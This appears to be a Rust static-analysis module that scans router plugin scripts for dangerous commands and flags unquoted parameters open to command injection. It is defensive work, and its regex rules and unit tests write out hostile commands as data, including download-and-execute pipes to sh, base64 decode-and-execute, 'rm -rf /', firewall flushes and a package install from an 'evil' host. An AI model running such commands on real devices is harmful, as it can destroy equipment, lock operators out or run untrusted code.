//! Análise estática do pacote — roda sempre, com ou sem IA configurada.
//!
//! Procura o que pode estragar o equipamento ou abrir a rede: regravar a
//! flash, apagar a configuração, trocar senha, derrubar a interface de
//! gerência, baixar e executar código, ação de leitura que escreve,
//! parâmetro sem `pattern` concatenado em linha de shell, conteúdo ofuscado.
//!
//! O sandbox já impede que o script alcance a central ou saia da rede. O que
//! esta análise protege é o **equipamento** — e ela aponta, não bloqueia: quem
//! decide instalar é o operador, com o relatório na frente.

use std::sync::OnceLock;

use regex::Regex;

use super::{Finding, Severity};
use crate::plugins::{
    effect::{self, Effect},
    package::PluginPackage,
    params,
};

struct Rule {
    id: &'static str,
    severity: Severity,
    pattern: &'static str,
    message: &'static str,
}

const RULES: &[Rule] = &[
    Rule {
        id: "flash-write",
        severity: Severity::Critical,
        pattern: r"\b(mtd\s+(-r\s+)?(write|erase)|sysupgrade|firstboot|jffs2reset|flash_erase)\b",
        message: "regrava a flash ou restaura o padrão de fábrica — pode inutilizar o equipamento",
    },
    Rule {
        id: "raw-disk",
        severity: Severity::Critical,
        pattern: r"\bdd\b[^\n]*\bof=/dev/",
        message: "escreve direto num dispositivo de bloco",
    },
    Rule {
        id: "wipe-root",
        severity: Severity::Critical,
        pattern: r"\brm\s+-[a-zA-Z]*[rR][a-zA-Z]*\s+/(\s|\*|$|\x22|')",
        message: "apaga a partir da raiz do sistema de arquivos",
    },
    Rule {
        id: "download-exec",
        severity: Severity::Critical,
        pattern: r"\b(wget|curl|uclient-fetch)\b[^\n|]*\|\s*(ba|a)?sh\b",
        message: "baixa e executa código de fora",
    },
    Rule {
        id: "decode-exec",
        severity: Severity::Critical,
        pattern: r"\bbase64\s+-d[^\n]*\|\s*(ba|a)?sh\b",
        message: "decodifica e executa conteúdo ofuscado",
    },
    Rule {
        id: "factory-reset",
        severity: Severity::Critical,
        pattern: r"/system\s+reset-configuration",
        message: "restaura o padrão de fábrica do RouterOS",
    },
    Rule {
        id: "credentials",
        severity: Severity::High,
        pattern: r"\b(passwd|chpasswd|authorized_keys|/etc/shadow|/user\s+set)\b",
        message: "altera senha ou chave de acesso — pode trancar o operador para fora",
    },
    Rule {
        id: "management-access",
        severity: Severity::High,
        pattern: r"\buci\s+(set|delete|del)\s+(dropbear|uhttpd|firewall|network\.lan)\b",
        message: "altera SSH, interface web, firewall ou a LAN de gerência — pode cortar o acesso",
    },
    Rule {
        id: "firewall-flush",
        severity: Severity::High,
        pattern: r"\b(iptables|ip6tables)\s+-F\b|\bnft\s+flush\b",
        message: "limpa as regras de firewall",
    },
    Rule {
        id: "interface-down",
        severity: Severity::High,
        pattern: r"\b(ifdown|ip\s+link\s+set\s+\S+\s+down|ifconfig\s+\S+\s+down)\b",
        message: "derruba uma interface — se for a de gerência, o acesso cai",
    },
    Rule {
        id: "reboot",
        severity: Severity::Medium,
        pattern: r"\b(reboot|poweroff|halt|shutdown)\b|/system\s+reboot",
        message: "reinicia ou desliga o equipamento",
    },
    Rule {
        id: "foreign-package",
        severity: Severity::Medium,
        pattern: r"\bopkg\s+install\s+[^\n]*https?://|src/gz\s",
        message: "instala pacote de origem fora do repositório oficial",
    },
    Rule {
        id: "absolute-url",
        severity: Severity::Medium,
        pattern: r#"["'`]https?://"#,
        message: "URL absoluta no script — o runtime recusa; pode indicar tentativa de sair do equipamento",
    },
    Rule {
        id: "http-login",
        severity: Severity::Info,
        pattern: r"login\s*:\s*true",
        message: "requisição marcada como login (tratada como leitura) — confira se é mesmo só autenticação",
    },
];

fn compiled() -> &'static [(Regex, &'static Rule)] {
    static COMPILED: OnceLock<Vec<(Regex, &'static Rule)>> = OnceLock::new();
    COMPILED.get_or_init(|| {
        RULES
            .iter()
            .map(|rule| {
                (
                    Regex::new(&format!("(?i){}", rule.pattern)).expect("regra válida"),
                    rule,
                )
            })
            .collect()
    })
}

fn excerpt(line: &str) -> String {
    let trimmed = line.trim();
    if trimmed.chars().count() > 160 {
        format!("{}…", trimmed.chars().take(160).collect::<String>())
    } else {
        trimmed.to_owned()
    }
}

/// Avança até fechar `{` aberto na posição inicial, ignorando strings e comentários.
fn find_matching_brace(code: &str) -> usize {
    let bytes = code.as_bytes();
    let mut i = 0;
    let mut depth = 1_i32;
    while i < bytes.len() {
        match bytes[i] {
            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'/' => {
                i += 2;
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'*' => {
                i += 2;
                while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                    i += 1;
                }
                i = (i + 2).min(bytes.len());
            }
            quote @ (b'"' | b'\'' | b'`') => {
                i += 1;
                while i < bytes.len() {
                    if bytes[i] == b'\\' && i + 1 < bytes.len() {
                        i += 2;
                        continue;
                    }
                    if bytes[i] == quote {
                        i += 1;
                        break;
                    }
                    i += 1;
                }
            }
            b'{' => {
                depth += 1;
                i += 1;
            }
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return i;
                }
                i += 1;
            }
            _ => i += 1,
        }
    }
    bytes.len()
}

/// Remove comentários (`// ...` e `/* ... */`) preservando literais de string.
fn strip_comments(code: &str) -> String {
    let bytes = code.as_bytes();
    let mut out = String::with_capacity(code.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'/' && i + 1 < bytes.len() && bytes[i + 1] == b'/' {
            i += 2;
            while i < bytes.len() && bytes[i] != b'\n' {
                i += 1;
            }
        } else if bytes[i] == b'/' && i + 1 < bytes.len() && bytes[i + 1] == b'*' {
            i += 2;
            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                i += 1;
            }
            i = (i + 2).min(bytes.len());
        } else if matches!(bytes[i], b'"' | b'\'' | b'`') {
            let quote = bytes[i];
            let start = i;
            i += 1;
            while i < bytes.len() {
                if bytes[i] == b'\\' && i + 1 < bytes.len() {
                    i += 2;
                    continue;
                }
                if bytes[i] == quote {
                    i += 1;
                    break;
                }
                i += 1;
            }
            out.push_str(&code[start..i]);
        } else {
            let ch = code[i..].chars().next().expect("caractere UTF-8 válido");
            out.push(ch);
            i += ch.len_utf8();
        }
    }
    out
}

/// O corpo de cada `fn nome(...) { ... }` com a linha em que começa.
fn function_bodies(script: &str) -> Vec<(String, u32, String)> {
    static HEADER: OnceLock<Regex> = OnceLock::new();
    let header = HEADER.get_or_init(|| {
        Regex::new(r"(?m)^\s*(?:private\s+)?fn\s+([A-Za-z_][A-Za-z0-9_]*)\s*\([^)]*\)\s*\{")
            .expect("regex de função válida")
    });
    let mut bodies = Vec::new();
    for capture in header.captures_iter(script) {
        let (Some(whole), Some(name)) = (capture.get(0), capture.get(1)) else {
            continue;
        };
        let start = whole.end();
        let end = start + find_matching_brace(&script[start..]);
        let line = u32::try_from(script[..whole.start()].lines().count() + 1).unwrap_or(0);
        bodies.push((
            name.as_str().to_owned(),
            line,
            script[start..end].to_owned(),
        ));
    }
    bodies
}

/// Os comandos literais passados a `run`/`ssh`/`ssh_live`/`telnet` num
/// trecho — o começo da linha de shell, mesmo quando o resto é concatenado.
fn shell_commands(code: &str) -> Vec<String> {
    static COMMAND: OnceLock<Regex> = OnceLock::new();
    let command = COMMAND.get_or_init(|| {
        Regex::new(r#"\.(?:run|ssh|ssh_live|telnet)\s*\(\s*(?:"((?:[^"\\]|\\.)*)"|`([^`]*)`)"#)
            .expect("regex de comando válida")
    });
    command
        .captures_iter(code)
        .filter_map(|capture| capture.get(1).or_else(|| capture.get(2)))
        .map(|m| m.as_str().to_owned())
        .collect()
}

/// Requisição HTTP que altera (POST/PUT/PATCH/DELETE) sem ser login.
fn writes_over_http(code: &str) -> bool {
    static ALWAYS_WRITE: OnceLock<Regex> = OnceLock::new();
    static HTTP_MAP: OnceLock<Regex> = OnceLock::new();
    static POST_METHOD: OnceLock<Regex> = OnceLock::new();
    static LOGIN_TRUE: OnceLock<Regex> = OnceLock::new();
    let always_write = ALWAYS_WRITE.get_or_init(|| {
        Regex::new(r#"(?i)\.(post_form|post_json)\s*\(|method\s*:\s*"(put|patch|delete)""#)
            .expect("regex de escrita HTTP válida")
    });
    let http_map = HTTP_MAP
        .get_or_init(|| Regex::new(r#"\.http\s*\(\s*#\{"#).expect("regex de chamada http válida"));
    let post_method = POST_METHOD
        .get_or_init(|| Regex::new(r#"(?i)\bmethod\s*:\s*"post""#).expect("regex de POST válida"));
    let login_true = LOGIN_TRUE
        .get_or_init(|| Regex::new(r#"(?i)\blogin\s*:\s*true\b"#).expect("regex de login válida"));

    let clean = strip_comments(code);
    if always_write.is_match(&clean) {
        return true;
    }
    // O que sobra fora dos mapas inline já conferidos.
    let mut outside = String::with_capacity(clean.len());
    let mut cursor = 0;
    for found in http_map.find_iter(&clean) {
        let start = found.end();
        if start < cursor {
            continue;
        }
        let end = start + find_matching_brace(&clean[start..]);
        let map_body = &clean[start..end];
        if post_method.is_match(map_body) && !login_true.is_match(map_body) {
            return true;
        }
        outside.push_str(&clean[cursor..start]);
        cursor = end;
    }
    outside.push_str(&clean[cursor..]);
    // POST montado fora de `device.http(#{...})` inline (ex.: em variável
    // local): um login inline ao lado não o cobre.
    post_method.is_match(&outside) && !login_true.is_match(&outside)
}

/// Todos os achados do pacote, do mais grave para o menos.
#[must_use]
pub fn scan(package: &PluginPackage) -> Vec<Finding> {
    let mut findings = Vec::new();
    let script = &package.script;

    for (number, line) in script.lines().enumerate() {
        let trimmed = line.trim_start();
        if trimmed.starts_with("//") {
            continue;
        }
        for (regex, rule) in compiled() {
            if regex.is_match(line) {
                findings.push(Finding {
                    severity: rule.severity,
                    rule: rule.id.to_owned(),
                    message: rule.message.to_owned(),
                    line: u32::try_from(number + 1).ok(),
                    excerpt: Some(excerpt(line)),
                });
            }
        }
    }

    let bodies = function_bodies(script);
    for action in &package.manifest.actions {
        let Some((_, line, body)) = bodies.iter().find(|(name, ..)| name == &action.id) else {
            continue;
        };
        if action.effect == Effect::Read {
            if writes_over_http(body) {
                findings.push(Finding {
                    severity: Severity::High,
                    rule: "read-action-writes".into(),
                    message: format!(
                        "a ação `{}` se declara de leitura mas faz requisição HTTP de escrita",
                        action.id
                    ),
                    line: Some(*line),
                    excerpt: None,
                });
            }
            for literal in shell_commands(body) {
                if effect::classify_command(&literal) == Effect::Write {
                    findings.push(Finding {
                        severity: Severity::High,
                        rule: "read-action-writes".into(),
                        message: format!(
                            "a ação `{}` se declara de leitura mas contém um comando de escrita",
                            action.id
                        ),
                        line: Some(*line),
                        excerpt: Some(excerpt(&literal)),
                    });
                }
            }
        }
        for name in params::unconstrained_strings(action.params.as_ref()) {
            let used = body.contains(&format!("params.{name}"))
                || body.contains(&format!("params[\"{name}\"]"));
            let quoted = body.contains(&format!("shell_quote(params.{name})"))
                || body.contains(&format!("shell_quote(params[\"{name}\"])"));
            if used && !quoted {
                findings.push(Finding {
                    severity: Severity::Medium,
                    rule: "unquoted-param".into(),
                    message: format!(
                        "o parâmetro `{name}` de `{}` não tem `pattern` nem `enum` e não passa por \
                         `shell_quote` — risco de injeção de comando",
                        action.id
                    ),
                    line: Some(*line),
                    excerpt: None,
                });
            }
        }
    }

    static BLOB: OnceLock<Regex> = OnceLock::new();
    let blob = BLOB.get_or_init(|| {
        Regex::new(r"[A-Za-z0-9+/=]{200,}|(\\x[0-9a-fA-F]{2}){20,}").expect("regex de blob válida")
    });
    if let Some(found) = blob.find(script) {
        findings.push(Finding {
            severity: Severity::Medium,
            rule: "obfuscated".into(),
            message: "bloco longo em base64/hex — conteúdo que não dá para revisar lendo".into(),
            line: u32::try_from(script[..found.start()].lines().count()).ok(),
            excerpt: Some(excerpt(found.as_str())),
        });
    }

    findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn package(script: &str, effect: &str, params: Option<serde_json::Value>) -> PluginPackage {
        let mut action = json!({ "id": "detect", "title": "Detectar", "effect": "read" });
        let mut actions = vec![action.clone()];
        action = json!({ "id": "acao", "title": "Ação", "effect": effect });
        if let Some(params) = params {
            action["params"] = params;
        }
        actions.push(action);
        serde_json::from_value(json!({
            "manifest": { "slug": "x", "name": "x", "version": "1.0.0",
                          "transports": ["ssh"], "actions": actions },
            "script": script,
            "usage": "Detectar. Ação."
        }))
        .unwrap()
    }

    fn rules(findings: &[Finding]) -> Vec<&str> {
        findings.iter().map(|f| f.rule.as_str()).collect()
    }

    #[test]
    fn cada_regra_perigosa_e_detectada() {
        for (script, rule) in [
            ("device.run(\"mtd write /tmp/fw firmware\")", "flash-write"),
            ("device.run(\"sysupgrade -n /tmp/x\")", "flash-write"),
            ("device.run(\"firstboot -y\")", "flash-write"),
            ("device.run(\"dd if=/tmp/x of=/dev/mtdblock3\")", "raw-disk"),
            ("device.run(\"rm -rf /\")", "wipe-root"),
            (
                "device.run(\"wget -O- http://x/s.sh | sh\")",
                "download-exec",
            ),
            ("device.run(\"echo aGk= | base64 -d | sh\")", "decode-exec"),
            (
                "device.run(\"/system reset-configuration\")",
                "factory-reset",
            ),
            ("device.run(\"passwd root\")", "credentials"),
            (
                "device.run(\"uci set dropbear.@dropbear[0].Port=2222\")",
                "management-access",
            ),
            ("device.run(\"iptables -F\")", "firewall-flush"),
            ("device.run(\"ifdown lan\")", "interface-down"),
            ("device.run(\"reboot\")", "reboot"),
            (
                "device.run(\"opkg install http://evil/x.ipk\")",
                "foreign-package",
            ),
            ("device.get(\"http://8.8.8.8/\")", "absolute-url"),
        ] {
            let found = scan(&package(script, "write", None));
            assert!(
                rules(&found).contains(&rule),
                "{rule} em {script}: {found:?}"
            );
        }
    }

    #[test]
    fn acao_de_leitura_com_comando_de_escrita_e_apontada() {
        let script = "fn detect(device, params) { 1 }\nfn acao(device, params) { device.run(\"uci commit network\") }";
        let found = scan(&package(script, "read", None));
        assert!(rules(&found).contains(&"read-action-writes"), "{found:?}");

        // O comando ao vivo passa pela mesma análise: o servidor em segundo
        // plano é escrita; o cliente do teste, não.
        let servidor = "fn detect(device, params) { 1 }\nfn acao(device, params) { device.ssh_live(\"iperf3 -s -D -p 5201\") }";
        assert!(rules(&scan(&package(servidor, "read", None))).contains(&"read-action-writes"));
        let cliente = "fn detect(device, params) { 1 }\nfn acao(device, params) { device.ssh_live(\"/tool bandwidth-test address=10.0.0.2 duration=5s\", #{}) }";
        assert!(scan(&package(cliente, "read", None)).is_empty());
    }

    #[test]
    fn parametro_livre_sem_aspas_e_apontado_e_com_shell_quote_nao() {
        let params = json!({ "type": "object", "properties": { "nome": { "type": "string" } } });
        let solto = "fn detect(device, params) { 1 }\nfn acao(device, params) { device.run(\"opkg info \" + params.nome) }";
        assert!(
            rules(&scan(&package(solto, "read", Some(params.clone())))).contains(&"unquoted-param")
        );
        let seguro = "fn detect(device, params) { 1 }\nfn acao(device, params) { device.run(\"opkg info \" + shell_quote(params.nome)) }";
        assert!(!rules(&scan(&package(seguro, "read", Some(params)))).contains(&"unquoted-param"));
    }

    #[test]
    fn comentario_nao_conta_e_ordem_e_do_mais_grave() {
        let script = "// reboot\nfn detect(device, params) { device.run(\"reboot\"); device.run(\"sysupgrade x\") }";
        let found = scan(&package(script, "write", None));
        assert_eq!(found[0].severity, Severity::Critical);
        assert_eq!(found.iter().filter(|f| f.rule == "reboot").count(), 1);
    }

    #[test]
    fn script_limpo_nao_tem_achados() {
        let script = "fn detect(device, params) { device.run(\"cat /etc/openwrt_release\") }\nfn acao(device, params) { 1 }";
        assert!(scan(&package(script, "read", None)).is_empty());
    }

    #[test]
    fn chave_em_string_e_login_true_em_outra_chamada_nao_enganam_scanner() {
        let com_chave_em_string = r#"
fn detect(device, params) { 1 }
fn acao(device, params) {
    let x = "}";
    device.run("uci commit network");
}
"#;
        assert!(
            rules(&scan(&package(com_chave_em_string, "read", None)))
                .contains(&"read-action-writes"),
            "chave dentro de string não pode encerrar o corpo da função antes do comando de escrita"
        );

        let login_e_post_malicioso = r#"
fn detect(device, params) { 1 }
fn acao(device, params) {
    device.http(#{ method: "POST", path: "/login", login: true });
    device.http(#{ method: "POST", path: "/reset" });
}
"#;
        assert!(
            rules(&scan(&package(login_e_post_malicioso, "read", None)))
                .contains(&"read-action-writes"),
            "login: true numa chamada não pode esconder um segundo POST de escrita"
        );

        let delete_com_login = r#"
fn detect(device, params) { 1 }
fn acao(device, params) {
    device.http(#{ method: "DELETE", path: "/users/1", login: true });
}
"#;
        assert!(
            rules(&scan(&package(delete_com_login, "read", None))).contains(&"read-action-writes"),
            "DELETE nunca é login"
        );

        let login_inline_e_post_em_variavel = r#"
fn detect(device, params) { 1 }
fn acao(device, params) {
    device.http(#{ method: "POST", path: "/login", login: true });
    let req = #{ method: "POST", path: "/reset" };
    device.http(req);
}
"#;
        assert!(
            rules(&scan(&package(
                login_inline_e_post_em_variavel,
                "read",
                None
            )))
            .contains(&"read-action-writes"),
            "login inline não cobre um POST de escrita montado em variável"
        );

        let so_login_inline = r#"
fn detect(device, params) { 1 }
fn acao(device, params) {
    device.http(#{ method: "POST", path: "/login", login: true });
    device.http(#{ method: "GET", path: "/status" });
}
"#;
        assert!(
            !rules(&scan(&package(so_login_inline, "read", None))).contains(&"read-action-writes"),
            "login sozinho é leitura"
        );
    }
}
